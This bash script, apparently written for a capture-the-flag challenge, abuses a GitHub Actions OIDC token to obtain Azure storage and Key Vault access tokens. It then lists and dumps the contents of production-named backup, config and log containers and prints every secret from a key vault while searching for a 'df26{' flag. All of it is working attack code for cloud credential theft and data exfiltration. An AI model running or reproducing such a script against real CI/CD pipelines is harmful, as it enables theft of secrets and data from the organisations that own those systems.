#!/bin/bash
set +e

TENANT="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
TU="https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token"

echo "=== TOKENS ==="
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')

CICD_STOR=$(curl -sS -X POST "$TU" \
  -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
  -d "scope=https://storage.azure.com/.default" \
  -d "grant_type=client_credentials" \
  --data-urlencode "client_assertion=$OIDC" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" | jq -r '.access_token // empty')

CICD_VAULT=$(curl -sS -X POST "$TU" \
  -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
  -d "scope=https://vault.azure.net/.default" \
  -d "grant_type=client_credentials" \
  --data-urlencode "client_assertion=$OIDC" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" | jq -r '.access_token // empty')
echo "CICD stor=${#CICD_STOR} vault=${#CICD_VAULT}"

echo ""
echo "=== LIST BLOBS IN ALL CONTAINERS ==="
HDR="x-ms-version: 2023-01-03"
AUTH="Authorization: Bearer $CICD_STOR"

echo "--- sttblbackupprodx3euoz/exports ---"
curl -sS "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list&include=metadata" \
  -H "$AUTH" -H "$HDR"

echo ""
echo "--- sttblappcfgprodx3euoz/config ---"
curl -sS "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list&include=metadata" \
  -H "$AUTH" -H "$HDR"

echo ""
echo "--- sttblcilogsprodx3euoz/logs ---"
curl -sS "https://sttblcilogsprodx3euoz.blob.core.windows.net/logs?restype=container&comp=list&include=metadata" \
  -H "$AUTH" -H "$HDR"

echo ""
echo "=== READ ALL BLOB CONTENTS ==="

# Read each blob found (we'll enumerate and read)
for SA in sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblcilogsprodx3euoz; do
  case $SA in
    sttblbackupprodx3euoz) CONT="exports" ;;
    sttblappcfgprodx3euoz) CONT="config" ;;
    sttblcilogsprodx3euoz) CONT="logs" ;;
  esac
  
  echo ""
  echo "=== $SA/$CONT ==="
  BLOBS=$(curl -sS "https://$SA.blob.core.windows.net/$CONT?restype=container&comp=list" \
    -H "$AUTH" -H "$HDR")
  
  # Extract blob names using grep/sed
  NAMES=$(echo "$BLOBS" | grep -oP '<Name>[^<]+</Name>' | sed 's/<Name>//g;s/<\/Name>//g')
  
  if [ -z "$NAMES" ]; then
    echo "  (no blobs)"
  else
    for BNAME in $NAMES; do
      echo "  BLOB: $BNAME"
      CONTENT=$(curl -sS "https://$SA.blob.core.windows.net/$CONT/$BNAME" \
        -H "$AUTH" -H "$HDR")
      echo "  CONTENT (first 2000 chars):"
      echo "$CONTENT" | head -c 2000
      echo ""
      
      # Check for flag pattern
      if echo "$CONTENT" | grep -q "df26{"; then
        echo "  *** FLAG FOUND IN $SA/$CONT/$BNAME ***"
      fi
    done
  fi
done

echo ""
echo "=== KV1: Read secrets with cicd-deployer vault token ==="
curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" \
  -H "Authorization: Bearer $CICD_VAULT" | jq '.value[]?.id'

# Get each secret value
for SNAME in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  VAL=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SNAME?api-version=7.4" \
    -H "Authorization: Bearer $CICD_VAULT" | jq -r '.value // empty')
  echo "  $SNAME = $VAL"
  if echo "$VAL" | grep -q "df26{"; then
    echo "  *** FLAG IN SECRET $SNAME ***"
  fi
done

echo ""
echo "=== KV2: Try read with cicd-deployer ==="
curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
  -H "Authorization: Bearer $CICD_VAULT" | head -c 500

echo ""
echo "=== DONE ==="